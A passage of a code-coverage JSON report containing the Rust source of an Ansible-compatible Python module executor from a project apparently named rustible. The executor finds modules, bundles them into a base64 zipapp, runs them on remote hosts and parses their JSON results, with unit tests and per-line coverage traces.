ne":340,"address":[31542745],"length":1,"stats":{"Line":0}},{"line":342,"address":[31542617,31542509],"length":1,"stats":{"Line":0}},{"line":346,"address":[31542523],"length":1,"stats":{"Line":0}},{"line":347,"address":[31543227,31542531],"length":1,"stats":{"Line":0}},{"line":348,"address":[31543428,31543467,31543333],"length":1,"stats":{"Line":0}},{"line":352,"address":[31543725,31541415],"length":1,"stats":{"Line":0}},{"line":353,"address":[31543802,31543741],"length":1,"stats":{"Line":0}},{"line":354,"address":[31544040,31543945],"length":1,"stats":{"Line":0}},{"line":355,"address":[31544146,31545804],"length":1,"stats":{"Line":0}},{"line":358,"address":[31544180,31545761],"length":1,"stats":{"Line":0}},{"line":360,"address":[31544607],"length":1,"stats":{"Line":0}},{"line":361,"address":[31544855],"length":1,"stats":{"Line":0}},{"line":363,"address":[31544619,31544727],"length":1,"stats":{"Line":0}},{"line":367,"address":[31544633],"length":1,"stats":{"Line":0}},{"line":368,"address":[31545337,31544641],"length":1,"stats":{"Line":0}},{"line":369,"address":[31545538,31545577,31545443],"length":1,"stats":{"Line":0}},{"line":373,"address":[31543756,31545844],"length":1,"stats":{"Line":0}},{"line":374,"address":[31547797,31545950,31547758],"length":1,"stats":{"Line":0}},{"line":377,"address":[31545972],"length":1,"stats":{"Line":0}},{"line":378,"address":[31546021],"length":1,"stats":{"Line":0}},{"line":379,"address":[31546285],"length":1,"stats":{"Line":0}},{"line":380,"address":[31546321,31546392],"length":1,"stats":{"Line":0}},{"line":382,"address":[31546401,31546295],"length":1,"stats":{"Line":0}},{"line":383,"address":[31546487,31546407],"length":1,"stats":{"Line":0}},{"line":385,"address":[31546442,31546852],"length":1,"stats":{"Line":0}},{"line":386,"address":[31546943,31546858],"length":1,"stats":{"Line":0}},{"line":389,"address":[31547504,31546901,31547591,31547317],"length":1,"stats":{"Line":0}},{"line":390,"address":[31547429,31547512,31547748,31547422],"length":1,"stats":{"Line":0}},{"line":393,"address":[31545982,31546047,31546160],"length":1,"stats":{"Line":0}},{"line":394,"address":[31546078,31546168,31546085,31546275],"length":1,"stats":{"Line":0}},{"line":399,"address":[31537872,31537878,31537472],"length":1,"stats":{"Line":0}},{"line":404,"address":[31537808],"length":1,"stats":{"Line":0}},{"line":407,"address":[31531664,31533202,31537427],"length":1,"stats":{"Line":0}},{"line":408,"address":[31531727],"length":1,"stats":{"Line":0}},{"line":411,"address":[31532146,31532062,31537425],"length":1,"stats":{"Line":0}},{"line":413,"address":[31532203],"length":1,"stats":{"Line":0}},{"line":414,"address":[31537401,31532332,31532241],"length":1,"stats":{"Line":0}},{"line":417,"address":[31537396,31532493],"length":1,"stats":{"Line":0}},{"line":418,"address":[31532979],"length":1,"stats":{"Line":0}},{"line":420,"address":[31532770,31532879],"length":1,"stats":{"Line":0}},{"line":425,"address":[31537391,31532805,31533514,31533224],"length":1,"stats":{"Line":0}},{"line":426,"address":[31533466],"length":1,"stats":{"Line":0}},{"line":428,"address":[31533579,31537316,31533526],"length":1,"stats":{"Line":0}},{"line":431,"address":[31533541],"length":1,"stats":{"Line":0}},{"line":432,"address":[31534033],"length":1,"stats":{"Line":0}},{"line":434,"address":[31534093,31534185],"length":1,"stats":{"Line":0}},{"line":435,"address":[31534870,31537273,31534299],"length":1,"stats":{"Line":0}},{"line":436,"address":[31535086],"length":1,"stats":{"Line":0}},{"line":437,"address":[31535198,31537252,31535113,31535450],"length":1,"stats":{"Line":0}},{"line":440,"address":[31535098,31535130],"length":1,"stats":{"Line":0}},{"line":443,"address":[31535132],"length":1,"stats":{"Line":0}},{"line":445,"address":[31535461],"length":1,"stats":{"Line":0}},{"line":446,"address":[31536310,31536650],"length":1,"stats":{"Line":0}},{"line":447,"address":[31536820],"length":1,"stats":{"Line":0}},{"line":448,"address":[31536915,31537120],"length":1,"stats":{"Line":0}},{"line":450,"address":[31536945,31536864],"length":1,"stats":{"Line":0}},{"line":453,"address":[31536275,31536356],"length":1,"stats":{"Line":0}},{"line":454,"address":[31536491],"length":1,"stats":{"Line":0}},{"line":458,"address":[31535478],"length":1,"stats":{"Line":0}},{"line":459,"address":[31535527,31535930],"length":1,"stats":{"Line":0}},{"line":460,"address":[31536108],"length":1,"stats":{"Line":0}},{"line":462,"address":[31535617,31535492],"length":1,"stats":{"Line":0}},{"line":463,"address":[31535752],"length":1,"stats":{"Line":0}},{"line":469,"address":[31534522,31534577],"length":1,"stats":{"Line":0}},{"line":470,"address":[31534325],"length":1,"stats":{"Line":0}},{"line":471,"address":[31534490,31534410],"length":1,"stats":{"Line":0}}],"covered":17,"coverable":203},{"path":["/","home","artur","Repositories","rustible","src","modules","python.rs"],"content":"//! Python module fallback executor\n//!\n//! This module enables execution of any Ansible Python module, providing\n//! backwards compatibility with the entire Ansible module ecosystem.\n//!\n//! It uses the AnsiballZ-style bundling format that Ansible uses:\n//! 1. Find the Ansible module Python file\n//! 2. Bundle it with arguments into a base64-encoded wrapper\n//! 3. Transfer to remote host via SSH\n//! 4. Execute with Python interpreter\n//! 5. Parse JSON result\n\nuse super::{ModuleError, ModuleOutput, ModuleParams, ModuleResult};\nuse crate::connection::{CommandResult, Connection, ExecuteOptions};\n\nuse base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};\nuse serde::{Deserialize, Serialize};\nuse std::collections::HashMap;\nuse std::io::{Cursor, Write};\nuse std::path::{Path, PathBuf};\nuse tracing::{debug, warn};\nuse walkdir::WalkDir;\nuse zip::write::FileOptions;\n\n/// Result from Ansible module execution (JSON format)\n#[derive(Debug, Deserialize, Serialize)]\npub struct AnsibleModuleResult {\n    /// Whether the module changed state\n    #[serde(default)]\n    pub changed: bool,\n\n    /// Human-readable message\n    #[serde(default)]\n    pub msg: Option\u003cString\u003e,\n\n    /// Whether the module failed\n    #[serde(default)]\n    pub failed: bool,\n\n    /// Failure message\n    #[serde(default)]\n    pub failure_msg: Option\u003cString\u003e,\n\n    /// Whether the task was skipped\n    #[serde(default)]\n    pub skipped: bool,\n\n    /// Additional return values\n    #[serde(flatten)]\n    pub data: HashMap\u003cString, serde_json::Value\u003e,\n}\n\n/// Python module executor for Ansible backwards compatibility\npub struct PythonModuleExecutor {\n    /// Paths to search for Ansible modules\n    module_paths: Vec\u003cPathBuf\u003e,\n\n    /// Cache of discovered module locations\n    module_cache: HashMap\u003cString, PathBuf\u003e,\n}\n\nimpl Default for PythonModuleExecutor {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl PythonModuleExecutor {\n    /// Create a new Python module executor with default search paths\n    pub fn new() -\u003e Self {\n        let mut module_paths = Vec::new();\n\n        // Standard Ansible module locations\n        if let Some(home) = std::env::var_os(\"HOME\") {\n            let home = PathBuf::from(home);\n            // User collections\n            module_paths.push(home.join(\".ansible/collections\"));\n            // User modules\n            module_paths.push(home.join(\".ansible/plugins/modules\"));\n        }\n\n        // System-wide locations\n        module_paths.push(PathBuf::from(\"/usr/share/ansible/plugins/modules\"));\n        module_paths.push(PathBuf::from(\n            \"/usr/lib/python3/dist-packages/ansible/modules\",\n        ));\n\n        // Check ANSIBLE_LIBRARY environment variable\n        if let Some(lib_path) = std::env::var_os(\"ANSIBLE_LIBRARY\") {\n            for path in std::env::split_paths(\u0026lib_path) {\n                module_paths.push(path);\n            }\n        }\n\n        Self {\n            module_paths,\n            module_cache: HashMap::new(),\n        }\n    }\n\n    /// Add a custom module search path\n    pub fn add_module_path(\u0026mut self, path: impl Into\u003cPathBuf\u003e) {\n        self.module_paths.insert(0, path.into());\n    }\n\n    /// Find an Ansible module by name\n    ///\n    /// Supports both short names (e.g., \"apt\") and FQCNs (e.g., \"ansible.builtin.apt\")\n    ///\n    /// Searches in order:\n    /// 1. Module cache\n    /// 2. FQCN resolution in collections (if name contains dots)\n    /// 3. User collections (~/.ansible/collections)\n    /// 4. User modules (~/.ansible/plugins/modules)\n    /// 5. System modules (/usr/share/ansible/...)\n    pub fn find_module(\u0026mut self, name: \u0026str) -\u003e Option\u003cPathBuf\u003e {\n        // Check cache first\n        if let Some(path) = self.module_cache.get(name) {\n            if path.exists() {\n                return Some(path.clone());\n            }\n        }\n\n        // Handle fully-qualified collection names (e.g., \"ansible.builtin.apt\")\n        if let Some(path) = self.find_fqcn_module(name) {\n            self.module_cache.insert(name.to_string(), path.clone());\n            return Some(path);\n        }\n\n        // Extract simple module name for non-FQCN search\n        let module_name = if name.contains('.') {\n            name.rsplit('.').next().unwrap_or(name)\n        } else {\n            name\n        };\n\n        // Search all paths for the module\n        for base_path in \u0026self.module_paths {\n            if !base_path.exists() {\n                continue;\n            }\n\n            // Try direct module file\n            let direct = base_path.join(format!(\"{}.py\", module_name));\n            if direct.exists() {\n                debug!(\"Found module {} at {}\", name, direct.display());\n                self.module_cache.insert(name.to_string(), direct.clone());\n                return Some(direct);\n            }\n\n            // Try in subdirectories (Ansible organizes by category)\n            if let Ok(entries) = std::fs::read_dir(base_path) {\n                for entry in entries.flatten() {\n                    let path = entry.path();\n                    if path.is_dir() {\n                        let module_file = path.join(format!(\"{}.py\", module_name));\n                        if module_file.exists() {\n                            debug!(\"Found module {} at {}\", name, module_file.display());\n                            self.module_cache\n                                .insert(name.to_string(), module_file.clone());\n                            return Some(module_file);\n                        }\n                    }\n                }\n            }\n        }\n\n        warn!(\"Module {} not found in any search path\", name);\n        None\n    }\n\n    /// Find a module using Fully Qualified Collection Name\n    ///\n    /// FQCN format: namespace.collection.module (e.g., \"ansible.builtin.apt\")\n    /// Resolves to: {collection_path}/ansible_collections/{namespace}/{collection}/plugins/modules/{module}.py\n    fn find_fqcn_module(\u0026self, name: \u0026str) -\u003e Option\u003cPathBuf\u003e {\n        let parts: Vec\u003c\u0026str\u003e = name.split('.').collect();\n\n        // Need at least 3 parts: namespace.collection.module\n        if parts.len() \u003c 3 {\n            return None;\n        }\n\n        let namespace = parts[0];\n        let collection = parts[1];\n        let module_name = parts[parts.len() - 1];\n\n        // Handle nested module paths (e.g., ansible.builtin.packaging.apt -\u003e packaging/apt.py)\n        let module_subpath = if parts.len() \u003e 3 {\n            parts[2..parts.len()].join(\"/\") + \".py\"\n        } else {\n            format!(\"{}.py\", module_name)\n        };\n\n        debug!(\n            \"Resolving FQCN {} -\u003e namespace:{}, collection:{}, module:{}\",\n            name, namespace, collection, module_name\n        );\n\n        // Get collection root paths\n        let collection_roots = self.get_collection_roots();\n\n        for root in collection_roots {\n            // Standard collection path: {root}/ansible_collections/{namespace}/{collection}/plugins/modules/\n            let collection_module_dir = root\n                .join(\"ansible_collections\")\n                .join(namespace)\n                .join(collection)\n                .join(\"plugins\")\n                .join(\"modules\");\n\n            if collection_module_dir.exists() {\n                let module_path = collection_module_dir.join(\u0026module_subpath);\n                if module_path.exists() {\n                    debug!(\"Found FQCN module {} at {}\", name, module_path.display());\n                    return Some(module_path);\n                }\n\n                // Also try without subdirectory nesting\n                let simple_path = collection_module_dir.join(format!(\"{}.py\", module_name));\n                if simple_path.exists() {\n                    debug!(\"Found FQCN module {} at {}\", name, simple_path.display());\n                    return Some(simple_path);\n                }\n            }\n        }\n\n        None\n    }\n\n    /// Get all collection root directories\n    fn get_collection_roots(\u0026self) -\u003e Vec\u003cPathBuf\u003e {\n        let mut roots = Vec::new();\n\n        // User collections\n        if let Some(home) = std::env::var_os(\"HOME\") {\n            let home = PathBuf::from(home);\n            roots.push(home.join(\".ansible/collections\"));\n        }\n\n        // ANSIBLE_COLLECTIONS_PATH environment variable\n        if let Some(collections_path) = std::env::var_os(\"ANSIBLE_COLLECTIONS_PATH\") {\n            for path in std::env::split_paths(\u0026collections_path) {\n                roots.push(path);\n            }\n        }\n\n        // System-wide collections\n        roots.push(PathBuf::from(\"/usr/share/ansible/collections\"));\n        roots.push(PathBuf::from(\"/etc/ansible/collections\"));\n\n        roots\n    }\n\n    /// Find the local Ansible library path\n    fn find_ansible_library(\u0026self) -\u003e Option\u003cPathBuf\u003e {\n        // Try to find it via python3\n        let output = std::process::Command::new(\"python3\")\n            .args(\u0026[\"-c\", \"import ansible; print(ansible.__path__[0])\"])\n            .output()\n            .ok()?;\n\n        if output.status.success() {\n            let path_str = String::from_utf8_lossy(\u0026output.stdout).trim().to_string();\n            let path = PathBuf::from(path_str);\n            if path.exists() {\n                return Some(path);\n            }\n        }\n        None\n    }\n\n    /// Bundle a module with its arguments and dependencies into a Zip file (AnsiballZ style)\n    pub fn bundle(\u0026self, module_path: \u0026Path, args: \u0026ModuleParams) -\u003e ModuleResult\u003cString\u003e {\n        let ansible_lib = self.find_ansible_library()\n            .ok_or_else(|| ModuleError::ExecutionFailed(\"Could not find Ansible library locally to bundle. Please ensure 'ansible' is installed on the controller machine.\".to_string()))?;\n\n        // Prepare in-memory zip\n        let mut buffer = Vec::new();\n        {\n            let mut zip = zip::ZipWriter::new(Cursor::new(\u0026mut buffer));\n            let options = FileOptions::default()\n                .compression_method(zip::CompressionMethod::Stored)\n                .unix_permissions(0o755);\n\n            // 1. Prepare module Injector as __main__.py\n            let args_json = serde_json::to_string(args).map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"Failed to serialize module arguments: {}\", e))\n            })?;\n\n            let module_source = std::fs::read_to_string(module_path).map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\n                    \"Failed to read module {}: {}\",\n                    module_path.display(),\n                    e\n                ))\n            })?;\n\n            // Prepend args injection to module source\n            // We use Base64 for args to avoid escaping issues\n            let injection_header = format!(\n                r#\"\nimport os\nimport json\nimport base64\nimport sys\n\n# Inject arguments\nAPP_ARGS_B64 = '{}'\nos.environ['ANSIBLE_MODULE_ARGS'] = base64.b64decode(APP_ARGS_B64).decode('utf-8')\n\n# Current directory (root of zip) is automatically in sys.path[0] when running as zipapp\n# but we explicitly ensure it for safety\nif sys.path[0] != os.path.dirname(__file__):\n    sys.path.insert(0, os.path.dirname(__file__))\n\n\"#,\n                BASE64.encode(args_json.as_bytes())\n            );\n\n            let final_main = format!(\"{}\\n{}\", injection_header, module_source);\n\n            zip.start_file(\"__main__.py\", options)\n                .map_err(|e| ModuleError::ExecutionFailed(format!(\"Zip error: {}\", e)))?;\n            zip.write_all(final_main.as_bytes())?;\n\n            // 2. Add ansible/module_utils\n            // We walk the module_utils directory and add everything\n            // This ensures common utils like basic.py are available\n            let module_utils_path = ansible_lib.join(\"module_utils\");\n            if module_utils_path.exists() {\n                // Determine the root for relative paths (the parent of 'ansible' dir)\n                // path: /usr/lib/python3/dist-packages/ansible\n                // parent: /usr/lib/python3/dist-packages\n                let lib_root = ansible_lib.parent().unwrap_or(\u0026ansible_lib);\n\n                for entry in WalkDir::new(\u0026module_utils_path) {\n                    let entry = entry.map_err(|e| {\n                        ModuleError::ExecutionFailed(format!(\"Failed to walk module_utils: {}\", e))\n                    })?;\n                    let path = entry.path();\n\n                    if path.is_file() {\n                        // We want 'ansible/module_utils/...' in the zip\n                        // If path is /usr/lib/.../ansible/module_utils/basic.py\n                        // and lib_root is /usr/lib/...\n                        // rel_path is ansible/module_utils/basic.py\n                        if let Ok(rel_path) = path.strip_prefix(lib_root) {\n                            let name = rel_path.to_string_lossy().into_owned();\n                            zip.start_file(name, options).map_err(|e| {\n                                ModuleError::ExecutionFailed(format!(\"Zip error: {}\", e))\n                            })?;\n                            let content = std::fs::read(path).map_err(|e| {\n                                ModuleError::ExecutionFailed(format!(\n                                    \"Failed to read {}: {}\",\n                                    path.display(),\n                                    e\n                                ))\n                            })?;\n                            zip.write_all(\u0026content)?;\n                        }\n                    }\n                }\n\n                // Ensure ansible/__init__.py exists\n                zip.start_file(\"ansible/__init__.py\", options)\n                    .map_err(|e| ModuleError::ExecutionFailed(format!(\"Zip error: {}\", e)))?;\n                zip.write_all(b\"\")?;\n            } else {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"ansible/module_utils not found at {}\",\n                    module_utils_path.display()\n                )));\n            }\n\n            zip.finish().map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"Failed to finish zip: {}\", e))\n            })?;\n        }\n\n        // Base64 encode the zip payload\n        let zip_b64 = BASE64.encode(\u0026buffer);\n\n        // Create the wrapper script that executes the zip\n        let wrapper = format!(\n            r#\"#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# Rustible AnsiballZ-compatible runner\nimport sys\nimport os\nimport base64\nimport tempfile\nimport runpy\n\n# The Zipapp payload (Ansible module + modules_utils)\nPAYLOAD = '{zip_b64}'\n\ndef main():\n    # Create temp file for the zipapp\n    fd, path = tempfile.mkstemp(suffix='.zip', prefix='rustible_')\n    os.close(fd)\n    \n    try:\n        # Write payload to disk\n        with open(path, 'wb') as f:\n            f.write(base64.b64decode(PAYLOAD))\n            \n        # Execute the zipapp in-process\n        # This is equivalent to 'python path/to.zip'\n        sys.path.insert(0, path)\n        runpy.run_path(path, run_name='__main__')\n        \n    except Exception as e:\n        import json\n        print(json.dumps({{'failed': True, 'msg': str(e)}}))\n    finally:\n        try:\n            if os.path.exists(path):\n                os.remove(path)\n        except:\n            pass\n\nif __name__ == '__main__':\n    main()\n\"#\n        );\n\n        Ok(wrapper)\n    }\n\n    /// Execute a Python module on a remote connection\n    pub async fn execute(\n        \u0026mut self,\n        conn: \u0026dyn Connection,\n        module_name: \u0026str,\n        args: \u0026ModuleParams,\n        python_interpreter: \u0026str,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Find the module\n        let module_path = self.find_module(module_name)\n            .ok_or_else(|| ModuleError::ModuleNotFound(format!(\n                \"Ansible module '{}' not found. Ensure Ansible is installed or check ANSIBLE_LIBRARY path.\",\n                module_name\n            )))?;\n\n        // Bundle the module\n        let wrapper = self.bundle(\u0026module_path, args)?;\n\n        debug!(\n            \"Executing Python module {} via {} ({} bytes)\",\n            module_name,\n            python_interpreter,\n            wrapper.len()\n        );\n\n        // Execute on remote host\n        // We pipe the script directly to Python for efficiency (like Ansible pipelining)\n        let command = format!(\"{} -c {}\", python_interpreter, shell_escape(\u0026wrapper));\n\n        let result = conn\n            .execute(\u0026command, Some(ExecuteOptions::new()))\n            .await\n            .map_err(|e| {\n                ModuleError::ExecutionFailed(format!(\"Failed to execute Python module: {}\", e))\n            })?;\n\n        // Parse the result\n        self.parse_result(\u0026result, module_name)\n    }\n\n    /// Parse the JSON result from Python module execution\n    fn parse_result(\n        \u0026self,\n        result: \u0026CommandResult,\n        module_name: \u0026str,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let stdout = result.stdout.trim();\n\n        // Try to find JSON in the output (skip any non-JSON preamble)\n        let json_start = stdout.find('{');\n        let json_str = match json_start {\n            Some(pos) =\u003e \u0026stdout[pos..],\n            None =\u003e stdout,\n        };\n\n        // Parse the JSON result\n        let parsed: AnsibleModuleResult = serde_json::from_str(json_str).map_err(|e| {\n            // If JSON parsing fails, check if it's a command error\n            if result.exit_code != 0 {\n                ModuleError::ExecutionFailed(format!(\n                    \"Module {} failed with exit code {}: {}\",\n                    module_name,\n                    result.exit_code,\n                    result.stderr.trim()\n                ))\n            } else {\n                ModuleError::ExecutionFailed(format!(\n                    \"Failed to parse module {} output as JSON: {}. Output: {}\",\n                    module_name, e, stdout\n                ))\n            }\n        })?;\n\n        // Convert to ModuleOutput\n        if parsed.failed {\n            return Err(ModuleError::ExecutionFailed(\n                parsed.msg.unwrap_or_else(|| \"Module failed\".to_string()),\n            ));\n        }\n\n        let msg = parsed\n            .msg\n            .unwrap_or_else(|| format!(\"Module {} executed successfully\", module_name));\n\n        let mut output = if parsed.changed {\n            ModuleOutput::changed(msg)\n        } else {\n            ModuleOutput::ok(msg)\n        };\n\n        // Add additional data from module result\n        for (key, value) in parsed.data {\n            // Skip internal keys\n            if !matches!(key.as_str(), \"changed\" | \"failed\" | \"msg\" | \"skipped\") {\n                output = output.with_data(key, value);\n            }\n        }\n\n        Ok(output)\n    }\n}\n\n/// Escape a string for shell execution\nfn shell_escape(s: \u0026str) -\u003e String {\n    // Use Python's ability to handle base64 to avoid shell escaping issues\n    let b64 = BASE64.encode(s.as_bytes());\n    format!(\n        \"\\\"import base64,sys;exec(base64.b64decode('{}').decode())\\\"\",\n        b64\n    )\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_executor_creation() {\n        let executor = PythonModuleExecutor::new();\n        assert!(!executor.module_paths.is_empty());\n    }\n\n    #[test]\n    fn test_bundle_generation() {\n        let executor = PythonModuleExecutor::new();\n        let temp_module = std::env::temp_dir().join(\"test_module.py\");\n        std::fs::write(\n            \u0026temp_module,\n            \"def main(): import json; print(json.dumps({'changed': True}))\",\n        )\n        .unwrap();\n\n        let mut args = HashMap::new();\n        args.insert(\"name\".to_string(), serde_json::json!(\"test\"));\n\n        // Only run this test if ansible is available\n        if executor.find_ansible_library().is_some() {\n            let bundle = executor.bundle(\u0026temp_module, \u0026args).unwrap();\n            assert!(bundle.contains(\"PAYLOAD\"));\n            assert!(bundle.contains(\"runpy.run_path\"));\n        }\n\n        std::fs::remove_file(\u0026temp_module).ok();\n    }\n\n    #[test]\n    fn test_parse_success_result() {\n        let executor = PythonModuleExecutor::new();\n        let result = CommandResult {\n            exit_code: 0,\n            stdout: r#\"{\"changed\": true, \"msg\": \"Package installed\"}\"#.to_string(),\n            stderr: String::new(),\n            success: true,\n        };\n\n        let output = executor.parse_result(\u0026result, \"apt\").unwrap();\n        assert!(output.changed);\n        assert!(output.msg.contains(\"Package installed\"));\n    }\n\n    #[test]\n    fn test_parse_failed_result() {\n        let executor = PythonModuleExecutor::new();\n        let result = CommandResult {\n            exit_code: 0,\n            stdout: r#\"{\"failed\": true, \"msg\": \"Permission denied\"}\"#.to_string(),\n            stderr: String::new(),\n            success: true,\n        };\n\n        let err = executor.parse_result(\u0026result, \"apt\").unwrap_err();\n        assert!(matches!(err, ModuleError::ExecutionFailed(_)));\n    }\n\n    #[test]\n    fn test_fqcn_parsing() {\n        let executor = PythonModuleExecutor::new();\n\n        // Test that FQCN with less than 3 parts returns None\n        assert!(executor.find_fqcn_module(\"apt\").is_none());\n        assert!(executor.find_fqcn_module(\"builtin.apt\").is_none());\n\n        // Full FQCN format is parsed (module won't exist but path resolution works)\n        // This tests the parsing logic, not actual file existence\n    }\n\n    #[test]\n    fn test_collection_roots() {\n        let executor = PythonModuleExecutor::new();\n        let roots = executor.get_collection_roots();\n\n        // Should have at least user and system collection paths\n        assert!(!roots.is_empty());\n\n        // Should include standard system paths\n        let has_system_path = roots.iter().any(|p| {\n            p.to_string_lossy()\n                .contains(\"/usr/share/ansible/collections\")\n                || p.to_string_lossy().contains(\"/etc/ansible/collections\")\n        });\n        assert!(has_system_path);\n    }\n}\n","traces":[{"line":63,"address":[24848496],"length":1,"stats":{"Line":0}},{"line":64,"address":[24848504],"length":1,"stats":{"Line":0}},{"line":70,"address":[24842543,24841440,24841902],"length":1,"stats":{"Line":1}},{"line":71,"address":[24841457],"length":1,"stats":{"Line":1}},{"line":74,"address":[24841487,24841556],"length":1,"stats":{"Line":2}},{"line":75,"address":[24841623],"length":1,"stats":{"Line":1}},{"line":77,"address":[24841672,24841743],"length":1,"stats":{"Line":2}},{"line":79,"address":[24841803],"length":1,"stats":{"Line":1}},{"line":83,"address":[24841921,24841630],"length":1,"stats":{"Line":2}},{"line":84,"address":[24841928],"length":1,"stats":{"Line":1}},{"line":89,"address":[24841979],"length":1,"stats":{"Line":1}},{"line":90,"address":[24842095,24842218],"length":1,"stats":{"Line":0}},{"line":91,"address":[24842382,24842411],"length":1,"stats":{"Line":0}},{"line":97,"address":[24842136],"length":1,"stats":{"Line":1}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[24827567,24826768,24827561],"length":1,"stats":{"Line":0}},{"line":118,"address":[24826834],"length":1,"stats":{"Line":0}},{"line":119,"address":[24826946],"length":1,"stats":{"Line":0}},{"line":120,"address":[24827053],"length":1,"stats":{"Line":0}},{"line":125,"address":[24827133,24826974],"length":1,"stats":{"Line":0}},{"line":126,"address":[24827165,24827296,24827327,24827539],"length":1,"stats":{"Line":0}},{"line":127,"address":[24827451],"length":1,"stats":{"Line":0}},{"line":131,"address":[24827212,24827612],"length":1,"stats":{"Line":0}},{"line":132,"address":[24827614],"length":1,"stats":{"Line":0}},{"line":134,"address":[24827580],"length":1,"stats":{"Line":0}},{"line":138,"address":[24827715,24827736],"length":1,"stats":{"Line":0}},{"line":139,"address":[24827813],"length":1,"stats":{"Line":0}},{"line":144,"address":[24828325],"length":1,"stats":{"Line":0}},{"line":145,"address":[24828637,24828554],"length":1,"stats":{"Line":0}},{"line":146,"address":[24828687,24830922,24831200],"length":1,"stats":{"Line":0}},{"line":147,"address":[24831153,24831826,24831583,24831614],"length":1,"stats":{"Line":0}},{"line":148,"address":[24831738],"length":1,"stats":{"Line":0}},{"line":152,"address":[24828680,24828767,24828718],"length":1,"stats":{"Line":0}},{"line":153,"address":[24828875,24828971,24828808],"length":1,"stats":{"Line":0}},{"line":154,"address":[24829050],"length":1,"stats":{"Line":0}},{"line":155,"address":[24829147,24829227],"length":1,"stats":{"Line":0}},{"line":156,"address":[24829288],"length":1,"stats":{"Line":0}},{"line":157,"address":[24829612,24829529],"length":1,"stats":{"Line":0}},{"line":158,"address":[24829718,24829661,24830041],"length":1,"stats":{"Line":0}},{"line":159,"address":[24829991,24830516],"length":1,"stats":{"Line":0}},{"line":160,"address":[24830524,24830436,24830467,24830826,24830003],"length":1,"stats":{"Line":0}},{"line":161,"address":[24830594],"length":1,"stats":{"Line":0}},{"line":168,"address":[24827839,24828037],"length":1,"stats":{"Line":0}},{"line":169,"address":[24828019],"length":1,"stats":{"Line":0}},{"line":176,"address":[24834112,24839407,24838562],"length":1,"stats":{"Line":1}},{"line":177,"address":[24834167],"length":1,"stats":{"Line":1}},{"line":180,"address":[24834262,24834333],"length":1,"stats":{"Line":2}},{"line":181,"address":[24834385],"length":1,"stats":{"Line":1}},{"line":184,"address":[24834339,24834411],"length":1,"stats":{"Line":0}},{"line":185,"address":[24834434],"length":1,"stats":{"Line":0}},{"line":186,"address":[24834504],"length":1,"stats":{"Line":0}},{"line":189,"address":[24834653],"length":1,"stats":{"Line":0}},{"line":190,"address":[24834900,24834729],"length":1,"stats":{"Line":0}},{"line":192,"address":[24834702,24834759],"length":1,"stats":{"Line":0}},{"line":195,"address":[24835082,24835373,24834861],"length":1,"stats":{"Line":0}},{"line":201,"address":[24835363],"length":1,"stats":{"Line":0}},{"line":203,"address":[24835816,24835978],"length":1,"stats":{"Line":0}},{"line":205,"address":[24836055,24836645,24836353,24836396,24836479,24836522,24836270],"length":1,"stats":{"Line":0}},{"line":207,"address":[24836369],"length":1,"stats":{"Line":0}},{"line":208,"address":[24836495],"length":1,"stats":{"Line":0}},{"line":212,"address":[24837759,24837011],"length":1,"stats":{"Line":0}},{"line":213,"address":[24837107],"length":1,"stats":{"Line":0}},{"line":214,"address":[24837268,24837185],"length":1,"stats":{"Line":0}},{"line":215,"address":[24838575,24838902,24837326],"length":1,"stats":{"Line":0}},{"line":216,"address":[24838806],"length":1,"stats":{"Line":0}},{"line":220,"address":[24837397,24837303],"length":1,"stats":{"Line":0}},{"line":221,"address":[24837658,24837575],"length":1,"stats":{"Line":0}},{"line":222,"address":[24837793,24837704,24838154],"length":1,"stats":{"Line":0}},{"line":223,"address":[24838066],"length":1,"stats":{"Line":0}},{"line":228,"address":[24836118],"length":1,"stats":{"Line":0}},{"line":232,"address":[24841420,24840560,24840915],"length":1,"stats":{"Line":1}},{"line":233,"address":[24840585],"length":1,"stats":{"Line":1}},{"line":236,"address":[24840668,24840599],"length":1,"stats":{"Line":2}},{"line":237,"address":[24840732],"length":1,"stats":{"Line":1}},{"line":238,"address":[24840844,24840778],"length":1,"stats":{"Line":2}},{"line":242,"address":[24840921,24840739],"length":1,"stats":{"Line":2}},{"line":243,"address":[24841107,24841006],"length":1,"stats":{"Line":0}},{"line":244,"address":[24841271,24841300],"length":1,"stats":{"Line":0}},{"line":249,"address":[24841318,24841013],"length":1,"stats":{"Line":2}},{"line":250,"address":[24841325],"length":1,"stats":{"Line":1}},{"line":252,"address":[24841386],"length":1,"stats":{"Line":1}},{"line":256,"address":[24840492,24840520,24839424],"length":1,"stats":{"Line":1}},{"line":258,"address":[24839449,24839618],"length":1,"stats":{"Line":2}},{"line":259,"address":[24839492],"length":1,"stats":{"Line":1}},{"line":263,"address":[24840474,24839862],"length":1,"stats":{"Line":1}},{"line":264,"address":[24839924],"length":1,"stats":{"Line":1}},{"line":265,"address":[24840176],"length":1,"stats":{"Line":1}},{"line":266,"address":[24840318,24840247],"length":1,"stats":{"Line":2}},{"line":267,"address":[24840363],"length":1,"stats":{"Line":1}},{"line":270,"address":[24839896],"length":1,"stats":{"Line":0}},{"line":274,"address":[24842576,24846880,24848369],"length":1,"stats":{"Line":1}},{"line":275,"address":[24842689,24842655,24842819],"length":1,"stats":{"Line":2}},{"line":276,"address":[24842668,24842755],"length":1,"stats":{"Line":1}},{"line":279,"address":[24842908],"length":1,"stats":{"Line":1}},{"line":281,"address":[24843067,24842979],"length":1,"stats":{"Line":2}},{"line":282,"address":[24843074],"length":1,"stats":{"Line":1}},{"line":283,"address":[24843130],"length":1,"stats":{"Line":1}},{"line":287,"address":[25780907,25780656,25780901],"length":1,"stats":{"Line":1}},{"line":288,"address":[25780747,25780683],"length":1,"stats":{"Line":0}},{"line":291,"address":[25781472,25781868,25781862],"length":1,"stats":{"Line":2}},{"line":292,"address":[25781628],"length":1,"stats":{"Line":0}},{"line":294,"address":[25781536,25781604],"length":1,"stats":{"Line":0}},{"line":301,"address":[24843854],"length":1,"stats":{"Line":1}},{"line":318,"address":[24843741,24843824],"length":1,"stats":{"Line":2}},{"line":321,"